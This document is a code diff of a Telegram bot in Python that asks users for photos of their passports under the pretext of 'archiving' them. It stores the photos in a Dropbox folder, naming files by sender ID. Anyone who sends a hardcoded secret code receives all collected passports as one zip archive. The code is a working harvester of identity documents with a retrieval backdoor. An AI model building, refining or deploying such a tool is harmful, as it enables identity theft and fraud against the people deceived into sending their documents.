@@ -1,74 +1,92 @@
 # I LOVE DESH BEARCH
 
 import os
-import uuid
 import dropbox
-from aiogram import Bot, Dispatcher, types
-from aiogram.filters import Command, Text
-from aiogram.types import FSInputFile
-from aiogram.utils.keyboard import ReplyKeyboardBuilder
-from dotenv import load_dotenv
+import zipfile
+import io
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.filters import Command
+from aiogram.enums import ContentType
 
-# Загружаем переменные из .env
-load_dotenv()
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
+TOKEN = os.environ.get("BOT_TOKEN")
 DROPBOX_TOKEN = os.environ.get("DROPBOX_TOKEN")
+
 SECRET_CODE = "Q_FBR_PASSPORTS/DATA.GB$04743"
 PASS_FOLDER = "/passports"
 
-# Инициализация
-bot = Bot(token=BOT_TOKEN)
+bot = Bot(token=TOKEN)
 dp = Dispatcher()
 
 dbx = dropbox.Dropbox(DROPBOX_TOKEN)
 
-# Проверяем существование папки в Dropbox
+# --- Проверяем наличие папки passports ---
 try:
     dbx.files_get_metadata(PASS_FOLDER)
 except dropbox.exceptions.ApiError:
-    dbx.files_create_folder_v2(PASS_FOLDER)
+    dbx.files_create_folder(PASS_FOLDER)
 
-# Команда /start
-@dp.message(Command(commands=["start"]))
-async def cmd_start(message: types.Message):
-    await message.answer("Отправьте фото своего паспорта. Он будет заархивирован")
 
-# Обработка фото
-@dp.message(types.ContentType.PHOTO)
-async def handle_photo(message: types.Message):
-    photo = message.photo[-1]
-    file_id = str(uuid.uuid4())  # уникальное имя
-    file_info = await bot.get_file(photo.file_id)
-    file_bytes = await bot.download_file(file_info.file_path)
+@dp.message(Command("start"))
+async def start(msg: types.Message):
+    await msg.answer("Для архивации паспортных данных отправьте сюда фотографию паспорта")
 
-    filename = f"{file_id}.jpg"
-    path = f"{PASS_FOLDER}/{filename}"
 
-    try:
-        dbx.files_upload(file_bytes.read(), path)
-        await message.answer(f"Паспорт успешно заархивирован под именем")
-    except Exception as e:
-        await message.answer(f"Ошибка при архивации: {e}")
+# -------------------------------
+#  ЗАГРУЗКА ФОТО В DROPBOX
+# -------------------------------
+@dp.message(F.photo)
+async def save_photo(msg: types.Message):
 
-# Команда показать архив по секретному коду
-@dp.message()
-async def handle_secret_code(message: types.Message):
-    if message.text == SECRET_CODE:
-        try:
-            res = dbx.files_list_folder(PASS_FOLDER)
-            if not res.entries:
-                await message.answer("Архив пустой.")
-                return
+    file = await bot.get_file(msg.photo[-1].file_id)
+    file_bytes = await bot.download_file(file.file_path)
 
-            for entry in res.entries:
-                if isinstance(entry, dropbox.files.FileMetadata):
-                    metadata, file_content = dbx.files_download(entry.path_lower)
-                    await message.answer_document(file_content.content, filename=entry.name)
-        except Exception as e:
-            await message.answer(f"Ошибка при выдаче архива: {e}")
+    filename = f"{msg.from_user.id}_{msg.message_id}.jpg"
+    dropbox_path = f"{PASS_FOLDER}/{filename}"
 
-# Запуск бота
+    dbx.files_upload(
+        file_bytes.read(),
+        dropbox_path,
+        mode=dropbox.files.WriteMode("add")
+    )
+
+    await msg.answer("Паспорт успешно архивирован✅")
+
+
+# -------------------------------
+#  ПОЛУЧЕНИЕ ВСЕХ ФОТО ПО КОДУ
+# -------------------------------
+@dp.message(F.text == SECRET_CODE)
+async def send_archive(msg: types.Message):
+
+    entries = dbx.files_list_folder(PASS_FOLDER).entries
+
+    if not entries:
+        await msg.answer("Архив пуст.")
+        return
+
+    zip_buffer = io.BytesIO()
+
+    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as z:
+        for file in entries:
+            metadata, response = dbx.files_download(file.path_lower)
+            z.writestr(file.name, response.content)
+
+    zip_buffer.seek(0)
+
+    await msg.answer_document(
+        types.BufferedInputFile(
+            zip_buffer.read(),
+            filename="passports_archive.zip"
+        )
+    )
+
+
+# -------------------------------
+#  Запуск
+# -------------------------------
+async def main():
+    await dp.start_polling(bot)
+
 if __name__ == "__main__":
     import asyncio
-    asyncio.run(dp.start_polling(bot))
-    
+    asyncio.run(main())
